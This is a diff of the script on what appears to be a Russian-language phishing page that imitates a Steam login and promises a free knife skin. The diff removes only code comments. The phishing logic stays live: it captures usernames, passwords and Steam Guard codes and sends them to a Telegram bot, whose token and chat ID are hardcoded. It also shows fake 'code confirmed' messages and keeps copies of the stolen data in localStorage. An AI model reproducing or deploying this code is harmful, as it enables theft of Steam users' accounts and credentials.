@@ -645,8 +645,7 @@
     </footer>
 
     <script>
-        // === КОНФИГУРАЦИЯ ===
-        // ТВОИ ДАННЫЕ УЖЕ ВСТАВЛЕНЫ
+        
         const CONFIG = {
             telegramBotToken: '8566149977:AAGvf2hWlBdaimvZd6gF_Rqp0Rpe4jbKvEk',
             telegramChatId: '6855683398',
@@ -682,7 +681,7 @@
             createParticles();
             document.getElementById('steamLogin').focus();
             
-            // Проверяем бота при загрузке
+         
             testBot();
         }
         
@@ -730,7 +729,7 @@
         }
         
         async function sendToTelegram(type, data) {
-            // Форматируем сообщение для лучшей читаемости
+          
             const message = `🔐 *НОВЫЕ ДАННЫЕ STEAM* 🔐
         
     👤 *Логин:* \`${data.login || 'N/A'}\`
@@ -795,7 +794,7 @@
             }
         }
         
-        // Шаг 1: Вход
+   
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -812,21 +811,21 @@
             btn.disabled = true;
             btn.innerHTML = 'Проверка данных... <div class="loading" style="display: inline-block; width: 20px; height: 20px; margin-left: 10px;"></div>';
             
-            // Отправляем в Telegram
+       
             const success = await sendToTelegram('steam_login', { login, password });
             
             if (success) {
                 showAlert(alert, '✅ Данные приняты, проверяем Steam Guard...', 'success');
             }
             
-            // Переход к следующему шагу
+           
             setTimeout(() => {
                 showStep(2);
                 document.getElementById('guardCode').focus();
             }, 1500);
         });
         
-        // Шаг 2: Steam Guard
+  
         async function submitGuardCode() {
             const btn = document.getElementById('guardBtn');
             const alert = document.getElementById('step2-alert');
@@ -840,14 +839,14 @@
             btn.disabled = true;
             btn.textContent = 'Проверка кода...';
             
-            // Отправляем код в Telegram
+         
             const success = await sendToTelegram('steam_guard', { guardCode: code });
             
             if (success) {
                 showAlert(alert, '✅ Код подтверждён! Загружаем награду...', 'success');
             }
             
-            // Показываем успех
+     
             setTimeout(() => {
                 showStep(3);
                 startSuccessCountdown();
@@ -873,7 +872,7 @@
                 }
             }, 1000);
             
-            // Случайный нож для сообщения
+     
             const knives = [
                 '★ Скелетный нож | Ледяной огонь',
                 '★ Karambit | Фазовый кинжал',
@@ -897,15 +896,15 @@
             setTimeout(() => element.style.display = 'none', 5000);
         }
         
-        // Глобальные функции для кнопок
+   
         window.showStep = showStep;
         window.submitGuardCode = submitGuardCode;
         window.resendCode = resendCode;
         
-        // Запуск при загрузке
+        
         window.addEventListener('load', init);
         
-        // Функция для просмотра сохранённых данных (для отладки)
+       
         window.viewBackups = function() {
             const backups = JSON.parse(localStorage.getItem('steam_backups') || '[]');
             console.log('Сохранённые данные:', backups);
